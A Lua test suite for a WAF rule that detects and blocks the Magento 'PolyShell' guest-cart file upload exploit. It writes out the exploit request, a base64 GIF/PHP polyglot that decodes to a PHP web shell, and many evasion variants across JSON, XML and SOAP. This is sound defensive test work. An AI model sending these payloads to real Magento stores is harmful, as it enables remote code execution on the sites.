-- Tests for the Magento "PolyShell" unauth file upload detector (rule 10027,
-- WAF_CVE; CVE-2026-48356). Production tier: block.
--
-- Exploit (Sansec; the 2026-10-29 attack on orion):
--   POST /rest/default/V1/guest-carts/<cartId>/items      (application/json)
--   {"cartItem":{"sku":"…","qty":1,"quote_id":"<cartId>","product_option":
--    {"extension_attributes":{"custom_options":[{"option_id":"1",
--     "option_value":"file","extension_attributes":{"file_info":
--      {"base64_encoded_data":"R0lGODlh…","type":"image/gif","name":"x.php"}}}]}}}}
--   Magento writes the decoded file to pub/media/custom_options/quote/ before
--   the cart add fails.
--
-- Magento reads a field name with every `_` removed and the case ignored
-- (ServiceInputProcessor + hasMethod), so the detector does too.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local snap = waf.get_config()
check(snap.rule_cve_magento_polyshell == "block", "rule 10027 ships at block (got " .. tostring(snap.rule_cve_magento_polyshell) .. ")")
for k, _ in pairs(snap) do
  if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
end
waf.set_rule("rule_cve_magento_polyshell", "block")

local GUEST = "/rest/default/V1/guest-carts/m1lWDp8bG6UzMWVH5VWt38uq8Qj61O5k/items"
local GIF_PHP_B64 = "R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs8P3BocCBzeXN0ZW0oJF9HRVRbImMiXSk7ID8+"

local function attack_json(key, data_key)
  return '{"cartItem":{"sku":"P31629","qty":1,"quote_id":"m1lWDp8bG6UzMWVH5VWt38uq8Qj61O5k",' ..
    '"product_option":{"extension_attributes":{"custom_options":[{"option_id":"1",' ..
    '"option_value":"file","extension_attributes":{"' .. (key or "file_info") .. '":{"' ..
    (data_key or "base64_encoded_data") .. '":"' .. GIF_PHP_B64 ..
    '","type":"image/gif","name":"nxcmd20384.php"}}}]}}}}'
end

local function req(uri, body, opts)
  opts = opts or {}
  local headers = { ["content-type"] = opts.ct or "application/json" }
  if opts.cl ~= false then headers["content-length"] = tostring(opts.cl or #body) end
  return {
    uri = uri, args = opts.args or "", method = opts.method or "POST",
    ip = "213.163.195.0", headers = headers, body = body, cookie = "",
  }
end

local function fires(ctx, tag, label)
  local hit, reason, _, action = waf.check(ctx)
  check(hit == true, label .. " — hit (got " .. tostring(hit) .. ")")
  check(reason == "WAF_CVE:CVE_2026_48356:MAGENTO_POLYSHELL:" .. tag,
    label .. " — reason …:" .. tag .. " (got " .. tostring(reason) .. ")")
  check(action == "block", label .. " — block (got " .. tostring(action) .. ")")
end
local function clean(ctx, label)
  local hit, reason = waf.check(ctx)
  check(hit ~= true, label .. " — must not fire (got " .. tostring(reason) .. ")")
end

-- ── The attack, and the routes that take the same body ──────────────────────
fires(req(GUEST, attack_json()), "FILE_INFO", "the orion request (guest cart POST)")
fires(req(GUEST .. "/123", attack_json(), { method = "PUT" }), "FILE_INFO", "guest cart item PUT")
fires(req("/rest/V1/guest-carts/abc/items", attack_json()), "FILE_INFO", "no store code")
fires(req("/rest/all/V1/carts/mine/items", attack_json()), "FILE_INFO", "customer cart")
fires(req("/rest/default/V1/carts/42/items", attack_json()), "FILE_INFO", "admin cart")
fires(req("/index.php/rest/default/V1/guest-carts/abc/items", attack_json()), "FILE_INFO", "/index.php/rest/")
fires(req("/rest/default/async/V1/guest-carts/abc/items", attack_json()), "FILE_INFO", "async route")
fires(req("/rest/default/async/bulk/V1/guest-carts/byCartId/items", "[" .. attack_json() .. "]"),
  "FILE_INFO", "async bulk route")
fires(req("/REST/default/v1/Guest-Carts/abc/Items/", attack_json()), "FILE_INFO", "case and trailing slash")
fires(req("/rest//default//V1/guest-carts/abc//items", attack_json()), "FILE_INFO", "doubled slashes")

-- ── Spellings Magento reads as the same field ───────────────────────────────
fires(req(GUEST, attack_json("fileInfo", "base64EncodedData")), "FILE_INFO", "camelCase")
fires(req(GUEST, attack_json("FILE_INFO")), "FILE_INFO", "upper case")
fires(req(GUEST, attack_json("f_ile_info_")), "FILE_INFO", "extra underscores")
fires(req(GUEST, attack_json("\\u0066ile_info")), "FILE_INFO", "\\u-escaped key")
fires(req(GUEST, attack_json("decoy", "base64_encoded_data")), "FILE_INFO", "base64_encoded_data alone")
fires(req(GUEST, '{ "cartItem" : { "x" : { "file_info"\n  :\t{} } } }'), "FILE_INFO", "blanks before the colon")

-- XML bodies (Magento's REST takes application/xml and text/xml)
local XML = '<?xml version="1.0"?><cartItem><sku>P1</sku><productOption><extensionAttributes>' ..
  '<customOptions><item><optionId>1</optionId><optionValue>file</optionValue><extensionAttributes>' ..
  '<fileInfo><base64EncodedData>' .. GIF_PHP_B64 .. '</base64EncodedData><name>x.php</name></fileInfo>' ..
  '</extensionAttributes></item></customOptions></extensionAttributes></productOption></cartItem>'
fires(req(GUEST, XML, { ct = "application/xml" }), "FILE_INFO", "REST XML")
fires(req(GUEST, "\239\187\191" .. XML, { ct = "text/xml" }), "FILE_INFO", "REST XML with a BOM")
fires(req(GUEST, (XML:gsub("<fileInfo>", "<ns:file_info>"):gsub("</fileInfo>", "</ns:file_info>"))),
  "FILE_INFO", "namespaced snake_case element")
fires(req(GUEST, '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY f "x">]><cartItem>&f;</cartItem>',
  { ct = "application/xml" }), "XML_ENTITY", "XML entity declaration")
fires(req(GUEST, "<\0c\0a\0r\0t\0>\0", { ct = "application/xml" }), "UNREADABLE", "UTF-16 XML")
fires(req(GUEST, '<?xml version="1.0" encoding="UTF-7"?><cartItem/>', { ct = "application/xml" }),
  "UNREADABLE", "an exotic XML encoding")
fires(req(GUEST, 'x<cartItem/>', { ct = "application/xml" }), "UNREADABLE", "XML content type, body not XML")

-- SOAP runs the same services
local SOAP = '<?xml version="1.0"?><env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope">' ..
  '<env:Body><ns1:quoteGuestCartItemRepositoryV1SaveRequest><cartItem><productOption><extensionAttributes>' ..
  '<customOptions><item><extensionAttributes><fileInfo><base64EncodedData>' .. GIF_PHP_B64 ..
  '</base64EncodedData></fileInfo></extensionAttributes></item></customOptions></extensionAttributes>' ..
  '</productOption></cartItem></ns1:quoteGuestCartItemRepositoryV1SaveRequest></env:Body></env:Envelope>'
fires(req("/soap/default", SOAP, { args = "services=quoteGuestCartItemRepositoryV1", ct = "application/soap+xml" }),
  "FILE_INFO", "SOAP guest cart item save")

fires(req("/soap", SOAP, { args = "services=quoteGuestCartItemRepositoryV1" }), "FILE_INFO", "SOAP on /soap (no store)")
fires(req("/index.php/soap/all", SOAP, { args = "wsdl=0&services=quoteGuestCartItem%52epositoryV1" }),
  "FILE_INFO", "SOAP service %-encoded in the query")
fires(req("/soap/default", SOAP, { args = "services=quoteCartItemRepositoryV1+catalogProductRepositoryV1" }),
  "FILE_INFO", "SOAP, the customer/admin service among others")

-- Encodings the scan cannot read, wherever the declaration puts them
local EBCDIC = "\76\111\167\148\148" -- stands for EBCDIC element bytes (not ASCII names)
fires(req(GUEST, '<?xml version="1.0"' .. string.rep(" ", 600) .. 'encoding="IBM037"?>' .. EBCDIC,
  { ct = "application/xml" }), "UNREADABLE", "an encoding padded past the first bytes")
fires(req(GUEST, '\239\187\191<?xml version="1.0" encoding="IBM037"?>' .. EBCDIC, { ct = "application/xml" }),
  "UNREADABLE", "an EBCDIC declaration after a BOM")
fires(req(GUEST, "<?xml version='1.0' encoding='ISO-8859-7'?>" .. XML:gsub("^<%?xml[^>]*>", ""),
  { ct = "application/xml" }), "FILE_INFO", "a Latin/Greek declaration is still scanned")

-- ── Past the part of the body the edge reads ────────────────────────────────
do
  local cut = string.rep("a", 32768)
  fires(req(GUEST, cut, { cl = 106000 }), "OVERSIZE", "a body cut at the cap (the orion size)")
  fires(req(GUEST .. "/5", "", { method = "PUT", cl = 200000 }), "OVERSIZE", "a PUT the edge did not read")
  fires(req(GUEST .. "/5", "", { method = "PUT", cl = false }), "OVERSIZE", "a chunked PUT, unread")
  fires(req("/rest/V1/carts/mine/items", cut, { cl = 106000 }), "OVERSIZE", "carts/mine, cut")
  -- carts/<id> is a common REST shape outside Magento: only the field blocks
  clean(req("/rest/v1/carts/123/items/9", "", { method = "PUT", cl = false }), "a non-Magento API's chunked PUT")
  clean(req("/rest/v1/carts/123/items", cut, { cl = 106000 }), "a non-Magento API's large POST")
end

-- ── Not the attack ──────────────────────────────────────────────────────────
local ADD = '{"cartItem":{"sku":"24-MB01","qty":2,"quote_id":"abc","product_option":' ..
  '{"extension_attributes":{"custom_options":[{"option_id":"3","option_value":"Engraving: file info"}]}}}}'
clean(req(GUEST, ADD), "an ordinary add-to-cart with a text option")
clean(req(GUEST .. "/77", '{"cartItem":{"qty":3,"quote_id":"abc"}}', { method = "PUT" }), "a quantity change")
clean(req(GUEST, '{"cartItem":{"sku":"x","qty":1,"quote_id":"a","note":"my_profile_information: \\"file_info\\": yes"}}'),
  "the words inside a string value")
clean(req(GUEST, '{"cartItem":{"sku":"x","qty":1,"profile_information":"y"}}'), "a key that only contains fileinfo")
clean(req("/rest/default/V1/guest-carts", ""), "creating a guest cart (no body)")
clean(req("/rest/default/V1/guest-carts/abc/shipping-information", attack_json()), "another cart route")
clean(req("/rest/default/V1/products/sku/media", attack_json()), "admin product media (a legit base64 upload)")
clean(req("/checkout/cart/add/", attack_json()), "the storefront form route")
clean(req("/graphql", attack_json()), "GraphQL")
clean(req("/soap/default", SOAP, { args = "services=catalogProductRepositoryV1" }), "SOAP, another service")
clean({ uri = GUEST, args = "", method = "GET", ip = "203.0.113.1", headers = {}, body = "" }, "a GET")
clean(req("/blog/rest/v1/guest-carts-guide/items", attack_json()), "a path that only looks alike")

-- ── Unit ────────────────────────────────────────────────────────────────────
check(det.detect_cve_magento_polyshell(GUEST, "post", "", ADD, { ["content-length"] = tostring(#ADD) }) == nil,
  "unit: ordinary add")
check(det.detect_cve_magento_polyshell(GUEST, "delete", "", attack_json(), {}) == nil, "unit: DELETE is not a write")

if fails > 0 then
  io.stderr:write(fails .. " failure(s)\n")
  os.exit(1)
end
print("OK: cfm_waf magento polyshell tests passed")
